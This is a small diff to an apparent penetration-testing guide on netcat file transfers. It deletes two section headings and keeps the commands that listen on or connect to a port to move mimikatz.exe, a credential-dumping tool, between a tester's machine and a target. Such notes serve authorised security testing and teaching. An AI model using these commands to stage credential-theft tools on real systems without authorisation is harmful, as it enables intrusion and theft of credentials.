@@ -69,7 +69,7 @@ Netcat is a very versatile tool that also allows file transfers. The target or a
 ````bash
 nc -nlvp 8000 > mimikatz.exe
 ````
-### Connection Initiated by Pentester
+
 ````bash
 nc -nv 10.10.10.132 8000 <mimikatz.exe
 ````
@@ -77,7 +77,7 @@ nc -nv 10.10.10.132 8000 <mimikatz.exe
 ````bash
 nc -nv 10.10.10.32 8000 > mimikatz.exe
 ````
-### Connection Initiated by Target
+
 ````bash
 nc -nlvp 8000 <mimikatz.exe
 ````
